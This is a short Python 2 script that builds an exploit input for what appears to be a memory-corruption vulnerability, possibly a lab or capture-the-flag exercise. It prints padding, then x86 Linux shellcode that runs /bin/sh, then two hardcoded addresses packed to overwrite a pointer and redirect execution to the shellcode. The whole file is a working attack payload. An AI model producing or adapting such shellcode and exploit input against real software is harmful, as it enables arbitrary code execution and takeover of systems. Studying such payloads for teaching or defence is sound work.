from struct import pack
#jump 6 bytes to the start of shellcode
shellcode = ("\xeb\x06\xff\xff\xff\xff\xff\xff\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

print 'A'*40
print shellcode+'B'*9+pack("<I", 0x080f3750)+pack("<I", 0xbffeae3c)
print 'C'*40

